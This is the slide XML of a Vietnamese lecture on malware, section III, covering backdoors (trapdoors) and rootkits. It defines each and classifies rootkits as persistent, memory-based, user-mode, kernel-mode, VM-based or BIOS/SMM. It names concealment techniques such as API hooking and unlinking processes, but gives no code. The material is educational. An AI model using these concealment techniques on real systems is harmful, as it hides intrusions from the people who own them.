          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="1606378"/>
            <a:ext cx="10517725" cy="4565822"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Backdoor (Trapdoor)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1">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Là một điểm truy cập bí mật vào một ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình mà cho phép ng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ời biết về nó có đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợc truy cập mà không cần thông qua tiến trình truy cập bảo mật bình th</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ờng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Để debug, test ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> maintenance hook</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Đạt truy cập không đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ợc cấp quyền  threat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Thường đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ợc thực thi dưới dạng một dịch vụ mạng lắng nghe trên một cổng không chuẩn mà kẻ tấn công kết nối đến và phát lệnh trên hệ thống mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Khó kiểm soát backdoor của ứng dụng (update)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="128933823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371600" y="228600"/>
            <a:ext cx="9261024" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Hành vi ẩn giấu – Backdoor, rootkit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="1606378"/>
            <a:ext cx="10517725" cy="4565822"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Rootkit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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Bộ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chương</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>trình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> đư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>c </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cài</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>đặt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> trên hệ thống để duy trì truy cập bí mật t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ới hệ thống với</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="240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quyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>quản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> trị hệ thống, che giấu hiện diện </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ở mức độ cao nhất dựa trên khai thác c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> chế giám sát báo cáo tiến trình, file, registry trên máy tính.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Không </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dựa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lỗ</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hổng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cài</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đặt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> qua Trojan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cài</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đặt</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thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> qua </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tin tặc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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998369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371600" y="228600"/>
            <a:ext cx="9261024" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Hành vi ẩn giấu – Backdoor, rootkit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1606378"/>
            <a:ext cx="12192000" cy="4565822"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Rootkit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Phân loại:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Persistent: kích hoạt mỗi khi hệ thống boot </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>u mã độc ở vùng l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>u trữ persistent nh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> registry, hệ thống file  dễ phát hiện bởi scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Memory based (dựa trên bộ nhớ): không tồn tại đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ợc sau reboot  khó phát hiện</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> User mode: Chặn các l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>i gọi hàm API và chỉnh sửa giá trị trả về. (ví dụ chỉnh sửa kết quả trả về của hàm API liệt kê file để không bao gồm file có liên quan với rootkit)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Kernel mode: Có thể chặn các lời gọi hàm native API trong kernel mode. Rootkit có thể che giấu sự hiện diện của một tiến trình độc hại bằng việc loại nó khỏi danh sách các tiến trình active của kernel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Virtual machine based: cài đặt một phiên bản VMM (Virtual Machine Monitor) và chạy hệ điều hành, chặn và chỉnh sửa trạng thái/sự kiện xảy ra trong hệ thống ảo một cách trong suốt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> External mode: mã độc tồn tại trong BIOS hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>SMM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> (System Management Mode), truy cập trực tiếp phần cứng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="220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957417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371600" y="228600"/>
            <a:ext cx="9261024" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
